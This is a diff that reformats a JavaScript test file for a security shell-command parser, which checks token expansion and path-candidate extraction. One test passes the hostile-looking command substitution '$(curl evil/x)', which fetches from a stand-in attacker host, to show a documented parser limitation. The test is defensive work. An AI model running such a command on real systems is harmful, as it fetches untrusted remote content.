@@ -1,7 +1,11 @@
 import * as assert from 'node:assert/strict';
 import * as os from 'node:os';
 import { test, describe } from 'node:test';
-import { tokenizeCommand, expandToken, extractCandidates } from '../../scripts/security/shell-parser.js';
+import {
+  tokenizeCommand,
+  expandToken,
+  extractCandidates,
+} from '../../scripts/security/shell-parser.js';
 
 const homeDir = os.homedir();
 const mockPolicy = {
@@ -53,7 +57,10 @@ describe('expandToken', () => {
   test('records unresolved $UNSET variable', () => {
     const { expanded, unresolvedVars } = expandToken('$UNSET/x', mockPolicy);
     assert.equal(expanded, '$UNSET/x');
-    assert.ok(unresolvedVars.includes('$UNSET'), `Expected $UNSET in unresolvedVars, got ${JSON.stringify(unresolvedVars)}`);
+    assert.ok(
+      unresolvedVars.includes('$UNSET'),
+      `Expected $UNSET in unresolvedVars, got ${JSON.stringify(unresolvedVars)}`
+    );
   });
 
   test('expands multiple vars in one token', () => {
@@ -94,7 +101,10 @@ describe('extractCandidates', () => {
   test('find / -name foo emits / candidate', () => {
     const candidates = extractCandidates('find / -name foo', mockPolicy);
     const expanded = candidates.map((c) => c.expanded);
-    assert.ok(expanded.some((e) => e === '/'), `Expected / in candidates, got ${JSON.stringify(expanded)}`);
+    assert.ok(
+      expanded.some((e) => e === '/'),
+      `Expected / in candidates, got ${JSON.stringify(expanded)}`
+    );
   });
 
   test('documented limitation: $(curl evil/x) — evil/x is a candidate', () => {
@@ -102,6 +112,9 @@ describe('extractCandidates', () => {
     const candidates = extractCandidates('$(curl evil/x)', mockPolicy);
     const raws = candidates.map((c) => c.raw);
     // 'evil/x)' has a path separator, so it's a candidate (documented behavior, not an error)
-    assert.ok(raws.some((r) => r.includes('evil/x')), `Expected evil/x token as candidate: ${JSON.stringify(raws)}`);
+    assert.ok(
+      raws.some((r) => r.includes('evil/x')),
+      `Expected evil/x token as candidate: ${JSON.stringify(raws)}`
+    );
   });
 });
